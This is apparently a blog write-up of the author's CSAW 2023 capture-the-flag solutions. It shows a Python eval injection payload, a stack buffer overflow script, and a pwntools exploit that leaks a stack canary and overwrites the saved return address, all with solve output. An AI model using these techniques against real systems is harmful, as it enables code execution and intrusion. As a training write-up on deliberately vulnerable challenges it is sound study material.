---
title: "CSAW 2023 Writeup"
permalink: "/csaw23-writeups"
date: "2023-09-18"  # just to move this writeup to the top, the actual date is 9/16/23
---

# Table of Contents

1. [pwn](#pwn)
    1. [My First Pwnie](#my-first-pwnie-25-pts)
    2. [Target Practice](#target-practice-50-pts)
    3. [Puffin](#puffin-75-pts)
    4. [Unlimited Subway](#unlimited-subway)
2. [rev](#rev)
    1. [Baby's First](#babys-first-25-pts)
    2. [Baby's Third](#babys-third-50-pts)

Unfortunately I didn't have time to solve other challenges, so i just did the easy ones 😞

# PWN
---

## My First Pwnie [25 PTS]
Open the provided python code:

``` python
#!/usr/bin/env python3

# Pwn mostly builds on top of rev.
# While rev is more about understanding how a program works, pwn is more about figuring out how to exploit a program to reach the holy grail: Arbitrary Code Execution
#
# If you can execute arbitrary code on a system, that system might as well be yours...because you can do whatever you want with it! (this is the namesake of "pwn".....if you pwn a system, you own the system)
# Of course, that comes with the limitations of the environment you are executing code in...are you a restricted user, or a super admin?
# Sometimes you can make yourself a super admin starting from being a restricted user.....but we're not gonna do that right now.
#
# For now, I want you to figure out how to execute arbitrary commands on the server running the following code.
#
# To prove to me that you can excute whatever commands you want on the server, you'll need to get the contents of `/flag.txt`

try:
  response = eval(input("What's the password? "))
  print(f"You entered `{response}`")
  if response == "password":
    print("Yay! Correct! Congrats!")
    quit()
except:
  pass

print("Nay, that's not it.")
```

I remebered in previous CTFs seeing that the `eval` function isn't a safe function, and will execute whatever is given to it.

Doing some quick research I found this answer on [Stack Overflow](https://stackoverflow.com/questions/9383740/what-does-pythons-eval-do#:~:text=eval(%22__import__(%27os%27).remove(%27file%27)%22))

Final Payload: 

```python
__import__('os').system('cat /flag.txt')
```

> ``🚩:`` **csawctf{neigh______}**

## Target Practice [50 PTS]
---

Decompile the given binary in Ghidra:

![ghidra decompilation](/assets/csaw23/pwn/target_practice/ghidra_decompilation.png)

We can see on `line 18`, it will execute whatever memory address we input. Also notice that there is a `cat_flag` function: 

![cat flag function](/assets/csaw23/pwn/target_practice/flag_decompilation.png)

Since `PIE` isn't enabled the function addresses will be the same so we don't need any leaks:

![checksec results](/assets/csaw23/pwn/target_practice/checksec_results.png)


So we can just give the address of the `cat_flag` function as our input, and it will call the function. The address of `cat_flag` can be found in the disassembled window in Ghidra:

![disassembled flag func](/assets/csaw23/pwn/target_practice/flag_addr.png)

So our final input is just `0x00400717`

Sending that to the server gets us our flag!

![flag](/assets/csaw23/pwn/target_practice/flag_ss.png)

> ``🚩:`` **csawctf{y0ure_a_m4s7er4im3r}**

## Puffin [75 PTS]

Decompile with Ghidra:

![ghidra decompilation](/assets/csaw23/pwn/puffin/decompilation_main.png)

We can see on `line 14` there is a buffer overflow of 4 bytes, since we are taking in 48 bytes but the `input_buffer` only holds 44 bytes. 

We want to change the `target` variable to something other than zero. Since `input_buffer` and the `target` variables are on the stack, we can overwrite `target`.

All we need to do is give 48 bytes. 44 of those bytes will fill up the `input_buffer` and the next 4 bytes will change the `target` variable to something non-zero, giving us the flag.

Final solve script:

```python
from pwn import *

payload = b'A'*48 # can be any random 48 bytes

p = remote('intro.csaw.io', 31140) # connecting to the server

p.sendline(payload) # sending our payload

p.interactive() # to read the program's output
```
Running this script gets us the flag:

![flag](/assets/csaw23/pwn/puffin/flag.png)

> ``🚩:`` **csawctf{m4ybe_i_sh0u1dve_co113c73d_mor3_rock5_7o_impr355_her....}**


# REV
---

## Baby's First [25 PTS]

Open the provided python file:

```python
#!/usr/bin/env python3

# Reversing is hard. But....not always.
#
# Usually, you won't have access to source.
# Usually, these days, programmers are also smart enough not to include sensitive data in what they send to customers....
#
# But not always....

if input("What's the password? ") == "csawctf{w3_411_star7_5om3wher3}":
  print("Correct! Congrats! It gets much harder from here.")
else:
  print("Trying reading the code...")

# Notes for beginners:
#
# This is Python file. You can read about Python online, but it's a relatively simple programming language.
# You can run this from the terminal using the command `python3 babysfirst.py`, but I'll direct you to the internet again
# for how to use the terminal to accomplish that.
#
# Being able to run this file is not required to find the flag.
#
# You don't need to know Python to read this code, to guess what it does, or to solve the challenge.
```

We can see that it is checking if our input is `csawctf{w3_411_star7_5om3wher3}`. If it is, it will output `Correct! Congrats! It gets much harder from here.`. 

From this we can assume that is the flag.

> ``🚩:`` **csawctf{w3_411_star7_5om3wher3}**

## Baby's Third [50 PTS]
---

Open the readme.txt that was provided:

```
Reversing is hard. This time moreso than the last, but now by much.

This file is a compiled executable binary (which we refer to as just "binary" for short).

The process of compiling code is extremely complicated, but thankfully you don't need to know much about it to solve this challenge. At a high level, the source code is getting translated from a human-readable text file (not provided) to something much harder to read.... Try `cat`ing the file; it don't work so good. Much of the data in the program is encoded in such a way that makes it easier for the computer to understand - but there are still some elements in there intended to be interacted with by the user. So the question becomes "How do we extract that information?" And eventually "How to we better display that information intended for the computer to understand for a human to understand instead?" But that next question is for the next challenge...

And like we have tools for working with text (such as text editors, `cat`, whatever you're reading this in), there are tools for working with binaries as well. In Linux (it will be helpful to have a Linux VM or Linux system to run these programs in, though technically not required), you can install "bin utils". Most notably, binutils includes `objdump` and `strings`. One of those are what you need to solve this challenge...

Remember, the first rule of reading code is:

DON'T

READ

THE

CODE

(just read the important bits... 👀)
```

This mentions strings a lot, so I ran strings on the binary and got the flag.

Final solve command: `strings babysthird | grep csaw`

The `|` character will pipe the output from `strings` into `grep`. `grep csaw` will go through strings' output and look for a line that has `csaw` in it. Doing this gets us the flag:

![final flag](/assets/csaw23/rev/babys-third/final_flag_command.png)

> ``🚩:`` **csawctf{st1ng_th30ry_a1nt_so_h4rd}**

## Unlimited Subway
---
Decompile in Ghidra:

```C
undefined4 main(undefined4 param_1,EVP_PKEY_CTX *param_2)

{
  int in_GS_OFFSET;
  undefined4 index_buf;
  size_t name_size_buf;
  undefined2 local_8a;
  char user_input [35];
  char user_name_buf [18];
  int canary;
  
  canary = *(int *)(in_GS_OFFSET + 0x14);
  user_input[0] = '\0';
  user_input[1] = '\0';
  user_input[2] = '\0';
  user_input[3] = '\0';
  user_input[4] = '\0';
  user_input[5] = '\0';
  user_input[6] = '\0';
  user_input[7] = '\0';
  user_input[8] = '\0';
  user_input[9] = '\0';
  user_input[10] = '\0';
  user_input[11] = '\0';
  user_input[12] = '\0';
  user_input[13] = '\0';
  user_input[14] = '\0';
  user_input[15] = '\0';
  user_input[16] = '\0';
  user_input[17] = '\0';
  user_input[18] = '\0';
  user_input[19] = '\0';
  user_input[20] = '\0';
  user_input[21] = '\0';
  user_input[22] = '\0';
  user_input[23] = '\0';
  user_input[24] = '\0';
  user_input[25] = '\0';
  user_input[26] = '\0';
  user_input[27] = '\0';
  user_input[28] = '\0';
  user_input[29] = '\0';
  user_input[30] = '\0';
  user_input[31] = '\0';
  stack0xffffff98 = 0;
  user_name_buf[0] = '\0';
  user_name_buf[1] = '\0';
  user_name_buf[2] = '\0';
  user_name_buf[3] = '\0';
  user_name_buf[4] = '\0';
  user_name_buf[5] = '\0';
  user_name_buf[6] = '\0';
  user_name_buf[7] = '\0';
  user_name_buf[8] = '\0';
  user_name_buf[9] = '\0';
  user_name_buf[10] = '\0';
  user_name_buf[11] = '\0';
  user_name_buf[12] = '\0';
  user_name_buf[13] = '\0';
  user_name_buf[14] = '\0';
  user_name_buf[15] = '\0';
  stack0xffffffc8 = 0;
  local_8a = 0;
  index_buf = 0;
  name_size_buf = 0;
  init(param_2);
  while( true ) {
    while( true ) {
      while( true ) {
        print_menu();
        read(0,&local_8a,2);
        if ((char)local_8a != 'F') break;
        printf("Data : ");
        read(0,user_input,64);
      }
      if ((char)local_8a != 'V') break;
      printf("Index : ");
      __isoc99_scanf(&%d,&index_buf);
      view_account(user_input,index_buf);
    }
    if ((char)local_8a == 'E') break;
    puts("Invalid choice");
  }
  printf("Name Size : ");
  __isoc99_scanf(&%d,&name_size_buf);
  printf("Name : ");
  read(0,user_name_buf,name_size_buf);
  if (canary != *(int *)(in_GS_OFFSET + 0x14)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}


void view_account(int user_input,int index_buf)

{
  printf("Index %d : %02x\n",index_buf,(uint)*(byte *)(user_input + index_buf));
  return;
}

```
We can see that in the `view_account` function it will print whatever is at the offset we provide. 

Also there is a `buffer overflow` in the last few lines of main:

```c
printf("Name Size : ");
__isoc99_scanf(&%d,&name_size_buf);
printf("Name : ");
read(0,user_name_buf,name_size_buf);
```

This will call read on `n` number of bytes, where `n` is controlled by the user.


If we run checksec, we can see that there is a `canary`
```sh
└─$ checksec unlimited_subway
[*] '/mnt/i/ctfs/csaw/pwn/unlimited-subway/unlimited_subway'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```
This means that there will be a randomly generated 4 byte value since this binary is 32 bit. The last byte will also end in `\x00`. Before the program returns, it will check to see if the current `canary` value is the same as the old one. If it isn't then it will crash.

However, since the program is leaking bytes off the stack we can just leak the `canary`, and if we want to utilize our `buffer overflow` from earlier, we can just overwrite it with the same value. 

To leak the stack `canary` I made a quick script:

```
from pwn import *
context.binary = binary = ELF('./unlimited_subway)
p = process()
for i in range(200):
  payload = f'V\n{i}'.encode()
  p.sendline(payload)
  recv_text = f'Index {i} '.encode()
  p.recvuntil(recv_text)
  out = p.recvline().replace(b' ', b'').replace(b':', b'').strip()
  canary += out
  log.info(out)
```


After scrolling through the bytes that was outputted, I found some at offset 128 - 131

So I opened the binary up in `pwndbg` and sure enough I was leaking the `canary`.

![gdb canary](/assets/csaw23/pwn/unlimited_subway/gdb_canaries.png) 

![leaked canary](/assets/csaw23/pwn/unlimited_subway/program_canary.png)


Now we need to find how far away the `canary` is from our output. There is probably a better way to do this, but I just tried 100 characters, then 80, and so on until it didn't crash.

I found 64 bytes to be the number of bytes we can write before overwriting the `canary`. 

Then I just sent 64 junk bytes and the `canary` value. This doesn't crash the program, because in the program's pov the `canary` was never changed. 

![stack layout](/assets/csaw23/pwn/unlimited_subway/stack_layout.png)

*[Image Credit](https://bananamafia.dev/post/binary-canary-bruteforce/)*

We can see in this image that after the `canary` there is the saved base pointer or the saved `ebp` which is 4 bytes. 
So we write 4 more junk bytes after the `canary`, and then the address of `print_flag` in the saved `eip`.

When the program returns, it will call the `print_flag` function, and we will get the flag:

Final payload:
```py
from pwn import *
context.binary = binary = ELF('./unlimited_subway')

script = '''
b *main+500
b *main+505
'''

canary = b''
canary_list = []
# p = gdb.debug('./unlimited_subway', gdbscript=script)
p = remote('pwn.csaw.io', 7900)

for i in range(128,132):
    payload = f'V\n{i}'.encode()  # seeing what is at 128th - 131st memory locations
    p.sendline(payload)
    recv_text = f'Index {i} '.encode() 
    p.recvuntil(recv_text)  # receiving the byte at that location
    out = p.recvline().replace(b' ', b'').replace(b':', b'').strip().decode()  # get rid of spaces, newlines, colons, and convert to string
    canary_list.append(out)  # add each byte to the list
    log.info(out)


canary_list = canary_list[::-1]  # reverse the list because of little endian
canary = '0x'+''.join(canary_list)  # add 0x to the beginning of the canary variable and join the list with that
canary = int(canary,16)  # convert canary to int to use with p32

log.info(hex(canary))  # canary value

canary_offset = 64  # offset to start writing to the canary location

p.sendline(b'E')   # exits program
p.sendline(b'100')  # reads in 100 bytes

payload = b'A'*64  # padding to reach the canary
payload += p32(canary)  # overwriting the canary with itself 
payload += b'A'*4  # more padding to get to saved eip
payload += p32(binary.symbols.print_flag)  # overwriting saved eip with print_flag function

p.sendline(payload)


p.interactive()

```

And we get the flag!

```sh
└─$ python get.py
[*] '/mnt/i/ctfs/csaw/pwn/unlimited-subway/unlimited_subway'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Opening connection to pwn.csaw.io on port 7900: Done
[*] 00
[*] 3d
[*] 5f
[*] 67
[*] 0x675f3d00
[*] Switching to interactive mode
[F]ill account info
[V]iew account info
[E]xit
> Name Size : Name : csawctf{my_n4m3_15_079_4nd_1m_601n6_70_h0p_7h3_7urn571l3}
Segmentation fault (core dumped)
[*] Got EOF while reading in interactive
```